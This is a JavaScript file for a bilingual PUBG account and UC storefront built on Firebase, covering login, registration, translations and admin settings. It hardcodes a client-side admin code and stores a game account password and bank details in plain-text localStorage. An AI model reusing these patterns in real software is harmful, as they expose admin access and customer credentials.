/* ==================================================
   إعدادات الموقع
================================================== */

const ADMIN_CODE = "24680";

const STORAGE_KEY = "PUBG_MARKET_ACCOUNTS";
const SETTINGS_KEY = "PUBG_MARKET_SETTINGS";

const WHATSAPP_NUMBER = "9620792077942";

const COUNTRY_CODES = `AF AL DZ AS AD AO AI AQ AG AR AM AW AU AT AZ BS BH BD BB BY BE BZ BJ BM BT BO BQ BA BW BV BR IO BN BG BF BI CV KH CM CA KY CF TD CL CN CX CC CO KM CG CD CK CR CI HR CU CW CY CZ DK DJ DM DO EC EG SV GQ ER EE SZ ET FK FO FJ FI FR GF PF TF GA GM GE DE GH GI GR GL GD GP GU GT GG GN GW GY HT HM VA HN HK HU IS IN ID IR IQ IE IM IL IT JM JP JE JO KZ KE KI KP KR KW KG LA LV LB LS LR LY LI LT LU MO MG MW MY MV ML MT MH MQ MR MU YT MX FM MD MC MN ME MS MA MZ MM NA NR NP NL NC NZ NI NE NG NU NF MK MP NO OM PK PW PS PA PG PY PE PH PN PL PT PR QA RE RO RU RW BL SH KN LC MF PM VC WS SM ST SA SN RS SC SL SG SX SK SI SB SO ZA GS SS ES LK SD SR SJ SE CH SY TW TJ TZ TH TL TG TK TO TT TN TR TM TC TV UG UA AE GB US UM UY UZ VU VE VN VG VI WF EH YE ZM ZW` .split(" ");

const COUNTRY_ALIASES = {
    "قطر": "QA",
    "الأردن": "JO",
    "تركيا": "TR"
};

const I18N = {
    ar: {
        badge: "PUBG MARKET", storeSubtitle: "متجر ببجي", heroTitle: "كل ما تحتاجه", heroTitleAccent: "لببجي",
        heroDescription: "حسابات ببجي، شدات UC ورويال باس.", browseStore: "تصفح المتجر",
        searchPlaceholder: "ابحث عن حساب أو شدات أو رويال باس...", search: "بحث", store: "المتجر",
        products: "منتجات PUBG", productCount: "{count} منتج", all: "الكل", accounts: "حسابات",
        uc: "شدات UC", royalePass: "Royale Pass", noProducts: "لا توجد منتجات",
        noProductsDescription: "لم يتم العثور على منتجات مطابقة للبحث.", countryFilter: "الدولة",
        allCountries: "كل الدول", login: "تسجيل الدخول", register: "إنشاء حساب", logout: "تسجيل الخروج",
        authName: "الاسم", email: "البريد الإلكتروني", password: "كلمة السر", forgotPassword: "نسيت كلمة السر؟",
        confirmPassword: "تأكيد كلمة السر", confirmPasswordPlaceholder: "أعد كتابة كلمة السر", passwordsDoNotMatch: "كلمتا السر غير متطابقتين.",
        emailExistsLogin: "هذا الإيميل مسجل مسبقًا. تم تحويلك إلى تسجيل الدخول.",
        profilePhoto: "الصورة الشخصية",
        invalidPhoto: "تعذر قراءة الصورة. اختر صورة أخرى.",
        continueGoogle: "المتابعة باستخدام Google", or: "أو", createAccountPrompt: "ليس لديك حساب؟ إنشاء حساب",
        namePlaceholder: "اكتب اسمك", passwordPlaceholder: "6 أحرف على الأقل", orderConfirmation: "تأكيد الطلب",
        purchaseOrder: "طلب شراء", bankCard: "بطاقة بنكية", securePayment: "دفع آمن", securityConfirmed: "🔒 تأكيد الحماية",
        fastProcessing: "⚡ معالجة سريعة", trusted: "✅ موثوق", cardNumber: "رقم البطاقة", expiryDate: "تاريخ الانتهاء",
        cvv: "الرمز الثلاثي", cardholderName: "اسم حامل البطاقة", payNow: "دفع الآن",
        paymentNote: "سيتم إرسال تفاصيل حساب PUBG إلى بريدك الإلكتروني المسجل في الطلب.", adminPanel: "لوحة التحكم",
        adminDescription: "إضافة وتعديل وحذف حسابات وUC وRoyale Pass.", paymentSettings: "إعدادات الدفع وحساب PUBG",
        saveSettings: "حفظ الإعدادات", productType: "نوع المنتج", pubgAccount: "حساب PUBG", ucTopUp: "شدات PUBG UC",
        currency: "العملة", productName: "اسم المنتج", quantityLevel: "الكمية / المستوى", productDescription: "وصف المنتج",
        price: "السعر", productImages: "صور المنتج", imageLimit: "تستطيع اختيار حتى 10 صور.", saveProduct: "حفظ المنتج",
        newProduct: "منتج جديد", existingProducts: "المنتجات الموجودة",
        gatewayPlaceholder: "اسم البوابة أو الحساب البنكي", ownerPlaceholder: "اسم صاحب الحساب",
        accountNumberPlaceholder: "123456789", productNamePlaceholder: "مثال: حساب لفل 70 / 660 UC / Royale Pass",
        quantityPlaceholder: "مثال: 660 UC أو لفل 70", descriptionPlaceholder: "اكتب تفاصيل المنتج هنا...",
        firebaseConfig: "إعدادات Firebase غير مكتملة.", enterEmail: "اكتب بريدك الإلكتروني أولًا.",
        resetSent: "تم إرسال رابط تغيير كلمة السر إلى بريدك الإلكتروني.", openBrowser: "افتح الرابط في Chrome أو Edge خارج معاينة VS Code.",
        openingLogin: "جاري فتح تسجيل الدخول...", saveSettingsSuccess: "تم حفظ إعدادات الدفع وحساب PUBG بنجاح.",
        uploadError: "تعذر رفع المنتجات الحالية إلى Firebase.", saveFirebaseError: "تعذر حفظ البيانات على Firebase. تحقق من قواعد قاعدة البيانات.",
        saveProductSuccess: "تم حفظ المنتج بنجاح!", noAdminProducts: "لا توجد منتجات حاليًا.", imageCount: "صور",
        edit: "تعديل", delete: "حذف", confirmDelete: "هل تريد حذف المنتج {name}؟", incompleteFields: "يرجى إكمال جميع الحقول المطلوبة لإتمام الدفع.",
        missingGameCredentials: "لم يتم إعداد إيميل أو كلمة سر حساب PUBG من لوحة التحكم. يرجى إدخالهما أولًا.",
        paymentSuccess: "تم تأكيد الدفع بنجاح.\nستصل بيانات حساب PUBG إلى البريد الإلكتروني: {email}", notSet: "غير محدد",
        adminCodePrompt: "اكتب كود الإدارة:", wrongAdminCode: "كود الإدارة غير صحيح.",
        greeting: "مرحبًا {name}", previousImage: "الصورة السابقة", nextImage: "الصورة التالية", closeImages: "إغلاق الصور",
        genericError: "حدث خطأ ({code}).", showPassword: "إظهار كلمة السر", hidePassword: "إخفاء كلمة السر",
        receiptSubject: "تأكيد طلب شراء PUBG Market", receiptReady: "تمت معالجة طلبك بنجاح.", customer: "اسم العميل",
        product: "المنتج", priceLabel: "السعر", cardLastFour: "رقم البطاقة", expiryLabel: "تاريخ الانتهاء",
        paymentData: "بيانات الدفع", gatewayLabel: "اسم البوابة", ownerLabel: "اسم صاحب الحساب", accountLabel: "رقم الحساب",
        pubgData: "بيانات حساب PUBG", accountEmailLabel: "إيميل الحساب", accountPasswordLabel: "كلمة السر",
        receiptFooter: "تم تجهيز الحساب وسيتم تسليمه عبر هذا البريد الإلكتروني.",
        gatewayName: "اسم البوابة / الحساب البنكي", bankOwner: "اسم صاحب الحساب البنكي", bankAccountNumber: "رقم الحساب البنكي",
        iban: "IBAN", gameEmail: "إيميل حساب PUBG", gamePassword: "كلمة سر حساب PUBG", ibanPlaceholder: "SA...", gameEmailPlaceholder: "pubg@example.com", cardholderPlaceholder: "اسم صاحب البطاقة",
        pubgCredentials: "بيانات حساب PUBG", saveCredentials: "حفظ بيانات الحساب",
        details: "التفاصيل", buy: "شراء", noImage: "لا توجد صورة", noDescription: "لا يوجد وصف لهذا المنتج.",
        type: "النوع", country: "الدولة", buyVia: "شراء", footerText: "حسابات PUBG • UC • Royale Pass — كل الدول والعملات"
    },
    en: {
        badge: "PUBG MARKET", storeSubtitle: "PUBG store", heroTitle: "Everything you need", heroTitleAccent: "for PUBG",
        heroDescription: "PUBG accounts, UC top-ups, and Royale Pass.", browseStore: "Browse store",
        searchPlaceholder: "Search for an account, UC, or Royale Pass...", search: "Search", store: "Store",
        products: "PUBG products", productCount: "{count} products", all: "All", accounts: "Accounts",
        uc: "UC top-ups", royalePass: "Royale Pass", noProducts: "No products",
        noProductsDescription: "No products match your search.", countryFilter: "Country",
        allCountries: "All countries", login: "Log in", register: "Create account", logout: "Log out",
        authName: "Name", email: "Email", password: "Password", forgotPassword: "Forgot password?",
        confirmPassword: "Confirm password", confirmPasswordPlaceholder: "Re-enter your password", passwordsDoNotMatch: "The passwords do not match.",
        emailExistsLogin: "This email is already registered. You have been switched to sign in.",
        profilePhoto: "Profile photo",
        invalidPhoto: "Could not read the image. Choose another photo.",
        continueGoogle: "Continue with Google", or: "or", createAccountPrompt: "No account? Create one",
        namePlaceholder: "Enter your name", passwordPlaceholder: "At least 6 characters", orderConfirmation: "Order confirmation",
        purchaseOrder: "Purchase order", bankCard: "Bank card", securePayment: "Secure payment", securityConfirmed: "🔒 Security confirmed",
        fastProcessing: "⚡ Fast processing", trusted: "✅ Trusted", cardNumber: "Card number", expiryDate: "Expiry date",
        cvv: "CVV", cardholderName: "Cardholder name", payNow: "Pay now",
        paymentNote: "Your PUBG account details will be sent to the email used for this order.", adminPanel: "Admin panel",
        adminDescription: "Add, edit, and delete PUBG accounts, UC, and Royale Pass.", paymentSettings: "Payment and PUBG account settings",
        saveSettings: "Save settings", productType: "Product type", pubgAccount: "PUBG account", ucTopUp: "PUBG UC top-up",
        currency: "Currency", productName: "Product name", quantityLevel: "Quantity / level", productDescription: "Product description",
        price: "Price", productImages: "Product images", imageLimit: "You can select up to 10 images.", saveProduct: "Save product",
        newProduct: "New product", existingProducts: "Existing products",
        gatewayPlaceholder: "Gateway or bank account name", ownerPlaceholder: "Account owner name",
        accountNumberPlaceholder: "123456789", productNamePlaceholder: "Example: Level 70 account / 660 UC / Royale Pass",
        quantityPlaceholder: "Example: 660 UC or level 70", descriptionPlaceholder: "Enter product details...",
        firebaseConfig: "Firebase settings are incomplete.", enterEmail: "Enter your email first.",
        resetSent: "A password reset link was sent to your email.", openBrowser: "Open this link in Chrome or Edge outside the VS Code preview.",
        openingLogin: "Opening sign-in...", saveSettingsSuccess: "Payment and PUBG account settings saved.",
        uploadError: "Could not upload the current products to Firebase.", saveFirebaseError: "Could not save to Firebase. Check the database rules.",
        saveProductSuccess: "Product saved successfully!", noAdminProducts: "No products yet.", imageCount: "images",
        edit: "Edit", delete: "Delete", confirmDelete: "Delete product {name}?", incompleteFields: "Please complete all required fields to finish payment.",
        missingGameCredentials: "PUBG account email or password is not configured in the admin panel. Add them first.",
        paymentSuccess: "Payment confirmed.\nYour PUBG account details will be sent to: {email}", notSet: "Not set",
        adminCodePrompt: "Enter the admin code:", wrongAdminCode: "Incorrect admin code.",
        greeting: "Hello {name}", previousImage: "Previous image", nextImage: "Next image", closeImages: "Close images",
        genericError: "An error occurred ({code}).", showPassword: "Show password", hidePassword: "Hide password",
        receiptSubject: "PUBG Market purchase confirmation", receiptReady: "Your order was processed successfully.", customer: "Customer",
        product: "Product", priceLabel: "Price", cardLastFour: "Card number", expiryLabel: "Expiry date",
        paymentData: "Payment details", gatewayLabel: "Gateway name", ownerLabel: "Account owner", accountLabel: "Account number",
        pubgData: "PUBG account details", accountEmailLabel: "Account email", accountPasswordLabel: "Password",
        receiptFooter: "The account is ready and will be delivered to this email.",
        gatewayName: "Gateway / bank account name", bankOwner: "Bank account owner", bankAccountNumber: "Bank account number",
        iban: "IBAN", gameEmail: "PUBG account email", gamePassword: "PUBG account password", ibanPlaceholder: "SA...", gameEmailPlaceholder: "pubg@example.com", cardholderPlaceholder: "Cardholder name",
        pubgCredentials: "PUBG account credentials", saveCredentials: "Save account details",
        details: "Details", buy: "Buy", noImage: "No image", noDescription: "No description for this product.",
        type: "Type", country: "Country", buyVia: "Buy", footerText: "PUBG accounts • UC • Royale Pass — all countries and currencies"
    }
};

let currentLanguage = localStorage.getItem("GAMEVAULT_LANGUAGE") || "ar";

function t(key) {
    return I18N[currentLanguage][key] || I18N.ar[key] || key;
}

function countryCode(value) {
    return COUNTRY_ALIASES[value] || value || "";
}

function countryName(code) {
    const normalizedCode = countryCode(code).toUpperCase();
    try {
        return new Intl.DisplayNames([currentLanguage], { type: "region" }).of(normalizedCode) || normalizedCode;
    } catch {
        return normalizedCode;
    }
}

function flagForCountry(code) {
    return countryCode(code).toUpperCase().replace(/[A-Z]/g, letter => String.fromCodePoint(letter.charCodeAt(0) + 127397));
}

function countryLabel(code) {
    const normalizedCode = countryCode(code).toUpperCase();
    return `${flagForCountry(normalizedCode)} ${countryName(normalizedCode)}`;
}

function typeLabel(type) {
    return currentLanguage === "en"
        ? ({ "حساب": "PUBG account", UC: "UC top-up", "Royale Pass": "Royale Pass" }[type] || type)
        : ({ "حساب": "حساب PUBG", UC: "شحن UC", "Royale Pass": "Royale Pass" }[type] || type);
}

function localizedProductText(value) {
    const text = String(value || "");
    if (currentLanguage !== "en") {
        return text;
    }

    return text
        .replaceAll("دينار أردني", "Jordanian dinar")
        .replaceAll("دينار اردني", "Jordanian dinar")
        .replaceAll("ريال قطري", "Qatari riyal")
        .replaceAll("ليرة تركية", "Turkish lira")
        .replaceAll("دولار أمريكي", "US dollar")
        .replaceAll("حسابات", "accounts")
        .replaceAll("حساب", "account")
        .replaceAll("لفل", "Level")
        .replaceAll("مستوى", "Level")
        .replaceAll("شدات", "UC top-ups")
        .replaceAll("رويال باس", "Royale Pass")
        .replaceAll("السعر", "Price")
        .replaceAll("منتج", "product");
}

function applyTranslations() {
    document.documentElement.lang = currentLanguage;
    document.documentElement.dir = currentLanguage === "ar" ? "rtl" : "ltr";
    document.querySelectorAll("[data-i18n]").forEach(element => {
        element.textContent = t(element.dataset.i18n);
    });
    document.querySelectorAll("[data-i18n-placeholder]").forEach(element => {
        element.placeholder = t(element.dataset.i18nPlaceholder);
    });
    $("languageToggle").textContent = currentLanguage === "ar" ? "English" : "العربية";
    $("authTitle").textContent = authMode === "login" ? t("login") : t("register");
    $("authSubmit").textContent = authMode === "login" ? t("login") : t("register");
    $("authSwitch").textContent = authMode === "login" ? t("createAccountPrompt") : `${t("register")} / ${t("login")}`;
    $("passwordToggle").setAttribute("aria-label", $("authPassword").type === "text" ? t("hidePassword") : t("showPassword"));
    populateCountryOptions();
    populateCurrencyOptions();
    renderAccounts();
    if (currentAccount && !$('detailsModal').classList.contains('hidden')) {
        showDetails(currentAccount.id);
    } else if (currentAccount && !$('buyModal').classList.contains('hidden')) {
        openBuy(currentAccount.id);
    }
    if (!$('adminModal').classList.contains('hidden')) {
        renderAdmin();
    }
    if (auth?.currentUser) {
        updateAuthUI(auth.currentUser);
    }
}

function populateCountryOptions() {
    const filter = $("countryFilter");
    const accountSelect = $("accountCountry");
    if (!filter || !accountSelect) return;
    const selectedFilter = filter.value || "all";
    const selectedAccount = countryCode(accountSelect.value) || "QA";
    filter.innerHTML = `<option value="all">${escapeHTML(t("allCountries"))}</option>` + COUNTRY_CODES
        .map(code => `<option value="${code}">${escapeHTML(countryLabel(code))}</option>`).join("");
    accountSelect.innerHTML = COUNTRY_CODES
        .map(code => `<option value="${code}">${escapeHTML(countryLabel(code))}</option>`).join("");
    filter.value = COUNTRY_CODES.includes(selectedFilter) ? selectedFilter : "all";
    accountSelect.value = COUNTRY_CODES.includes(selectedAccount) ? selectedAccount : "QA";
}

function populateCurrencyOptions() {
    const select = $("accountCurrency");
    if (!select) return;
    const selected = select.value || "USD";
    const currencies = typeof Intl.supportedValuesOf === "function"
        ? Intl.supportedValuesOf("currency")
        : ["USD", "EUR", "GBP", "QAR", "JOD", "TRY"];
    select.innerHTML = currencies.map(code => {
        let name = code;
        try {
            name = new Intl.DisplayNames([currentLanguage], { type: "currency" }).of(code) || code;
        } catch { /* Keep the ISO code when the browser lacks a localized name. */ }
        return `<option value="${code}">${escapeHTML(name)} (${code})</option>`;
    }).join("");
    select.value = currencies.includes(selected) ? selected : "USD";
}

const DEFAULT_SETTINGS = {
    paymentGatewayName: "بوابة الدفع",
    bankAccountOwner: "",
    bankAccountNumber: "",
    bankIban: "",
    gameAccountEmail: "",
    gameAccountPassword: ""
};

const FIREBASE_CONFIG = {
    apiKey: "AIzaSyCqftmFq09lF9MsU19Q9QKhxR6RIu6X0WM",
    authDomain: "gamevault-5458b.firebaseapp.com",
    databaseURL: "https://gamevault-5458b-default-rtdb.firebaseio.com",
    projectId: "gamevault-5458b",
    storageBucket: "gamevault-5458b.firebasestorage.app",
    messagingSenderId: "886740058119",
    appId: "1:886740058119:web:51de63a7d6950c7e7a6aa2",
    measurementId: "G-CN11W2BWK7"
};

const firebaseReady =
    window.firebase
    && !FIREBASE_CONFIG.apiKey.startsWith("ضع_")
    && FIREBASE_CONFIG.databaseURL
    && !FIREBASE_CONFIG.databaseURL.startsWith("ضع_");

let auth = null;
let authMode = "login";
let selectedAuthImage = "";

let remoteAccounts = null;
let remoteProfiles = null;
const profileCache = new Map();
const loadedProfiles = new Set();

if (firebaseReady) {
    try {
        firebase.initializeApp(FIREBASE_CONFIG);
        remoteAccounts = firebase.database().ref("products");
        remoteProfiles = firebase.database().ref("profiles");
        auth = firebase.auth();
    } catch (error) {
        console.error("Firebase initialization failed", error);
    }
}

let currentAccount = null;
let selectedPayment = "تحويل بنكي";
let selectedImages = [];

let accounts = [];

function normalizeAccounts(result) {
    return (Array.isArray(result) ? result : Object.values(result || {}))
        .map(account => ({
            ...account,
            type: account.type || "حساب",
            quantity: account.quantity || "",
            images: Array.isArray(account.images) ? account.images : []
        }));
}

function loadAccounts() {

    const data = localStorage.getItem(STORAGE_KEY);

    let localAccounts = [];

    if (data) {
        try {
            localAccounts = normalizeAccounts(JSON.parse(data));
        } catch {
            localAccounts = [];
        }
    }

    accounts = localAccounts;
    renderAccounts();

    if (remoteAccounts) {
        remoteAccounts.on("value", snapshot => {
            if (!snapshot.exists() && localAccounts.length) {
                remoteAccounts.set(localAccounts).catch(() => {
                    alert(t("uploadError"));
                });
                return;
            }

            accounts = normalizeAccounts(snapshot.val());
            localStorage.setItem(STORAGE_KEY, JSON.stringify(accounts));
            renderAccounts();
        });
    }
}

function saveAccounts() {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(accounts));

    if (remoteAccounts) {
        remoteAccounts.set(accounts).catch(() => {
            alert(t("saveFirebaseError"));
        });
    }
}

function loadSettings() {
    const saved = localStorage.getItem(SETTINGS_KEY);
    if (!saved) {
        return { ...DEFAULT_SETTINGS };
    }

    try {
        return { ...DEFAULT_SETTINGS, ...JSON.parse(saved) };
    } catch {
        return { ...DEFAULT_SETTINGS };
    }
}

function saveSettings(settings) {
    localStorage.setItem(SETTINGS_KEY, JSON.stringify(settings));
}

function populateSettingsFields() {
    const settings = loadSettings();
    $("paymentGatewayName") && ($("paymentGatewayName").value = settings.paymentGatewayName || "");
    $("bankAccountOwner") && ($("bankAccountOwner").value = settings.bankAccountOwner || "");
    $("bankAccountNumber") && ($("bankAccountNumber").value = settings.bankAccountNumber || "");
    $("bankIban") && ($("bankIban").value = settings.bankIban || "");
    $("gameAccountEmail") && ($("gameAccountEmail").value = settings.gameAccountEmail || "");
    $("gameAccountPassword") && ($("gameAccountPassword").value = settings.gameAccountPassword || "");
}

$("saveGameCredentialsButton")?.addEventListener("click", function() {
    const settings = loadSettings();
    settings.gameAccountEmail = $("gameAccountEmail").value.trim();
    settings.gameAccountPassword = $("gameAccountPassword").value.trim();
    saveSettings(settings);
    alert(t("saveSettingsSuccess"));
});

$("saveSettingsButton")?.addEventListener("click", function() {
    const settings = {
        paymentGatewayName: $("paymentGatewayName").value.trim(),
        bankAccountOwner: $("bankAccountOwner").value.trim(),
        bankAccountNumber: $("bankAccountNumber").value.trim(),
        bankIban: $("bankIban").value.trim(),
        gameAccountEmail: $("gameAccountEmail").value.trim(),
        gameAccountPassword: $("gameAccountPassword").value.trim()
    };

    saveSettings(settings);
    alert(t("saveSettingsSuccess"));
});

loadAccounts();
populateSettingsFields();

function createID() {
    return Date.now().toString() + Math.random().toString(36).substring(2);
}

function $(id) {
    return document.getElementById(id);
}

function openModal(id) {
    $(id).classList.remove("hidden");
}

function closeModal(id) {
    $(id).classList.add("hidden");
}

function openAuth(mode) {
    authMode = mode;
    $("authTitle").textContent = mode === "login" ? t("login") : t("register");
    $("authNameGroup").classList.toggle("hidden", mode === "login");
    $("authPhotoGroup").classList.toggle("hidden", mode === "login");
    $("authPasswordConfirmGroup").classList.toggle("hidden", mode === "login");
    $("forgotPassword").classList.toggle("hidden", mode !== "login");
    $("authPassword").autocomplete = mode === "login" ? "current-password" : "new-password";
    $("authSubmit").textContent = mode === "login" ? t("login") : t("register");
    $("authSwitch").textContent = mode === "login" ? t("createAccountPrompt") : `${t("register")} / ${t("login")}`;
    $("authMessage").textContent = "";
    $("authPhoto").value = "";
    selectedAuthImage = "";
    $("authPhotoPreview").src = "";
    $("authPhotoPreview").classList.add("hidden");
    $("authPasswordConfirm").value = "";
    openModal("authModal");
}

function authErrorMessage(error) {
    const messages = currentLanguage === "en" ? {
        "auth/email-already-in-use": "This email is already in use.",
        "auth/invalid-email": "The email address is invalid.",
        "auth/weak-password": "The password must be at least 6 characters.",
        "auth/wrong-password": "The email or password is incorrect.",
        "auth/popup-closed-by-user": "The Google window was closed.",
        "auth/operation-not-allowed": "Enable this sign-in method in Firebase.",
        "auth/unauthorized-domain": "Sign-in is not allowed from this URL.",
        "auth/invalid-api-key": "The Firebase API key is invalid.",
        "auth/network-request-failed": "Network error. Please try again.",
        "auth/account-exists-with-different-credential": "This email uses another sign-in method. Use email and password.",
        "auth/credential-already-in-use": "This Google account is already in use.",
        "auth/user-not-found": "No account was found with this email and password."
    } : {
        "auth/email-already-in-use": "هذا البريد مستخدم من قبل.",
        "auth/invalid-email": "البريد الإلكتروني غير صالح.",
        "auth/weak-password": "كلمة السر يجب أن تكون 6 أحرف على الأقل.",
        "auth/wrong-password": "البريد أو كلمة السر غير صحيحة.",
        "auth/popup-closed-by-user": "تم إغلاق نافذة Google.",
        "auth/operation-not-allowed": "يجب تفعيل طريقة الدخول من Firebase.",
        "auth/unauthorized-domain": "تعذر تسجيل الدخول من هذا الرابط.",
        "auth/invalid-api-key": "مفتاح Firebase غير صحيح.",
        "auth/network-request-failed": "تعذر الاتصال بالإنترنت، حاول مرة أخرى.",
        "auth/account-exists-with-different-credential": "هذا البريد مسجل بطريقة دخول أخرى. استخدم البريد وكلمة السر.",
        "auth/credential-already-in-use": "حساب Google مستخدم من قبل.",
        "auth/user-not-found": "لا يوجد حساب بالبريد وكلمة السر بهذا البريد."
    };
    return messages[error.code] || t("genericError").replace("{code}", error.code || "unknown");
}

function getEmailDisplayName(user) {
    return (user.email || "user")
        .split("@")[0]
        .replace(/[._-]+/g, " ")
        .replace(/\b\w/g, letter => letter.toUpperCase())
        .trim();
}

function isGoogleUser(user) {
    return user?.providerData?.some(provider => provider.providerId === "google.com") || false;
}

function getUserPhoto(user) {
    if (!user) {
        return "";
    }

    if (!isGoogleUser(user)) {
        return localStorage.getItem(`GAMEVAULT_PROFILE_PHOTO_${user.uid}`) || user.photoURL || "";
    }

    return user.photoURL || user.providerData?.find(provider => provider.photoURL)?.photoURL || "";
}

function getCachedUserProfile(user) {
    let profile = profileCache.get(user.uid);
    if (!profile) {
        try {
            profile = JSON.parse(localStorage.getItem(`GAMEVAULT_PROFILE_${user.uid}`) || "null") || {};
        } catch {
            profile = {};
        }
        profileCache.set(user.uid, profile);
    }
    return profile;
}

async function saveUserProfile(user, profile = {}) {
    const data = {
        name: profile.name || (isGoogleUser(user) ? getEmailDisplayName(user) : user.displayName) || getEmailDisplayName(user),
        photoURL: profile.photoURL || getUserPhoto(user),
        email: user.email || "",
        provider: isGoogleUser(user) ? "google" : "password"
    };
    profileCache.set(user.uid, data);
    loadedProfiles.add(user.uid);
    localStorage.setItem(`GAMEVAULT_PROFILE_${user.uid}`, JSON.stringify(data));
    if (remoteProfiles) {
        await remoteProfiles.child(user.uid).set(data);
    }
}

async function loadUserProfile(user) {
    if (!user || !remoteProfiles || loadedProfiles.has(user.uid)) {
        return;
    }
    loadedProfiles.add(user.uid);
    try {
        const snapshot = await remoteProfiles.child(user.uid).once("value");
        if (snapshot.exists()) {
            const data = { ...getCachedUserProfile(user), ...snapshot.val() };
            if (isGoogleUser(user)) {
                data.name = getEmailDisplayName(user);
                data.photoURL = getUserPhoto(user);
            }
            profileCache.set(user.uid, data);
            localStorage.setItem(`GAMEVAULT_PROFILE_${user.uid}`, JSON.stringify(data));
            updateAuthUI(user);
        } else {
            await saveUserProfile(user);
        }
    } catch (error) {
        console.error("Could not load user profile", error);
    }
}

function updateAuthUI(user) {
    $("loginButton").classList.toggle("hidden", Boolean(user));
    $("registerButton").classList.toggle("hidden", Boolean(user));
    $("logoutButton").classList.toggle("hidden", !user);
    $("userProfile").classList.toggle("hidden", !user);
    if (user) {
        const profile = getCachedUserProfile(user);
        const googleAccount = isGoogleUser(user);
        const displayName = googleAccount ? getEmailDisplayName(user) : (profile.name || user.displayName || getEmailDisplayName(user));
        const photoURL = googleAccount ? getUserPhoto(user) : (profile.photoURL || getUserPhoto(user));
        $("userGreeting").textContent = displayName;
        $("userAvatar").classList.toggle("hidden", !photoURL);
        if (photoURL) {
            $("userAvatar").src = photoURL;
            $("userAvatar").alt = displayName;
        }
        loadUserProfile(user);
    } else {
        $("userAvatar").classList.add("hidden");
    }
}

if (auth) {
    auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL).catch(error => {
        console.error("Firebase persistence failed", error);
    });
    auth.onAuthStateChanged(updateAuthUI);
    auth.getRedirectResult()
        .then(result => {
            if (result.user) {
                closeModal("authModal");
                updateAuthUI(result.user);
            }
        })
        .catch(error => {
            openModal("authModal");
            $("authMessage").textContent = authErrorMessage(error);
            const googleButton = $("googleLoginButton");
            googleButton.disabled = false;
            googleButton.innerHTML = `<span class="google-icon">G</span> <span>${t("continueGoogle")}</span>`;
        });
}

$("loginButton").addEventListener("click", () => openAuth("login"));
$("registerButton").addEventListener("click", () => openAuth("register"));
$("logoutButton").addEventListener("click", () => {
    if (auth) {
        auth.signOut();
    }
});

$("authSwitch").addEventListener("click", () => {
    openAuth(authMode === "login" ? "register" : "login");
});

$("passwordToggle").addEventListener("click", () => {
    const password = $("authPassword");
    const isVisible = password.type === "text";
    password.type = isVisible ? "password" : "text";
    $("passwordToggle").textContent = isVisible ? "◉" : "○";
    $("passwordToggle").setAttribute("aria-label", isVisible ? t("showPassword") : t("hidePassword"));
});

function resizeImageToDataUrl(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => {
            const image = new Image();
            image.onload = () => {
                const size = 256;
                const scale = Math.min(size / image.width, size / image.height, 1);
                const canvas = document.createElement("canvas");
                canvas.width = Math.max(1, Math.round(image.width * scale));
                canvas.height = Math.max(1, Math.round(image.height * scale));
                canvas.getContext("2d").drawImage(image, 0, 0, canvas.width, canvas.height);
                resolve(canvas.toDataURL("image/jpeg", 0.8));
            };
            image.onerror = reject;
            image.src = reader.result;
        };
        reader.onerror = reject;
        reader.readAsDataURL(file);
    });
}

$("authPhoto").addEventListener("change", async event => {
    const file = event.target.files[0];
    if (!file) {
        return;
    }

    try {
        selectedAuthImage = await resizeImageToDataUrl(file);
        $("authPhotoPreview").src = selectedAuthImage;
        $("authPhotoPreview").classList.remove("hidden");
    } catch {
        selectedAuthImage = "";
        $("authMessage").textContent = t("invalidPhoto");
    }
});

$("forgotPassword").addEventListener("click", async () => {
    if (!auth) {
        $("authMessage").textContent = t("firebaseConfig");
        return;
    }

    const email = $("authEmail").value.trim();
    if (!email) {
        $("authMessage").textContent = t("enterEmail");
        $("authEmail").focus();
        return;
    }

    try {
        await auth.sendPasswordResetEmail(email, {
            url: "https://tameemdemir-create.github.io/gamevault/",
            handleCodeInApp: false
        });
        $("authMessage").textContent = t("resetSent");
    } catch (error) {
        if (error.code === "auth/email-already-in-use" && authMode === "register") {
            openAuth("login");
            $("authEmail").value = email;
            $("authMessage").textContent = t("emailExistsLogin");
            return;
        }
        $("authMessage").textContent = authErrorMessage(error);
    }
});

$("googleLoginButton").addEventListener("click", async () => {
    if (!auth) {
        $("authMessage").textContent = t("firebaseConfig");
        return;
    }

    if (window.top !== window.self) {
        $("authMessage").textContent = t("openBrowser");
        return;
    }

    const googleButton = $("googleLoginButton");
    googleButton.disabled = true;
    googleButton.textContent = t("openingLogin");

    try {
        await auth.signInWithRedirect(new firebase.auth.GoogleAuthProvider());
    } catch (error) {
        $("authMessage").textContent = authErrorMessage(error);
        googleButton.disabled = false;
    } finally {
        if (!auth.currentUser) {
            googleButton.innerHTML = `<span class="google-icon">G</span> <span>${t("continueGoogle")}</span>`;
        }
    }
});

$("authForm").addEventListener("submit", async event => {
    event.preventDefault();

    if (!auth) {
        $("authMessage").textContent = t("firebaseConfig");
        return;
    }

    const email = $("authEmail").value.trim();
    const password = $("authPassword").value;
    const passwordConfirm = $("authPasswordConfirm").value;
    const name = $("authName").value.trim();

    if (authMode === "register" && password !== passwordConfirm) {
        $("authMessage").textContent = t("passwordsDoNotMatch");
        $("authPasswordConfirm").focus();
        return;
    }

    try {
        if (authMode === "register") {
            const result = await auth.createUserWithEmailAndPassword(email, password);
            const profile = {};
            if (name) {
                profile.displayName = name;
            }
            if (Object.keys(profile).length) {
                await result.user.updateProfile(profile);
            }
            if (selectedAuthImage) {
                await saveUserProfile(result.user, {
                    name,
                    photoURL: selectedAuthImage
                });
            } else {
                await saveUserProfile(result.user, { name });
            }
            await result.user.reload();
            updateAuthUI(auth.currentUser || result.user);
        } else {
            await auth.signInWithEmailAndPassword(email, password);
            updateAuthUI(auth.currentUser);
        }

        event.target.reset();
        closeModal("authModal");
    } catch (error) {
        $("authMessage").textContent = authErrorMessage(error);
    }
});

function formatPrice(price, currency) {
    try {
        return new Intl.NumberFormat(currentLanguage === "ar" ? "ar" : "en", {
            style: "currency",
            currency: currency || "USD",
            maximumFractionDigits: 2
        }).format(Number(price) || 0);
    } catch {
        return `${Number(price) || 0} ${currency || "USD"}`;
    }
}

function escapeHTML(text) {
    return String(text || "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
}

function getProductIcon(type) {

    if (type === "UC") {
        return "";
    }

    if (type === "Royale Pass") {
        return "";
    }

    return "";

}


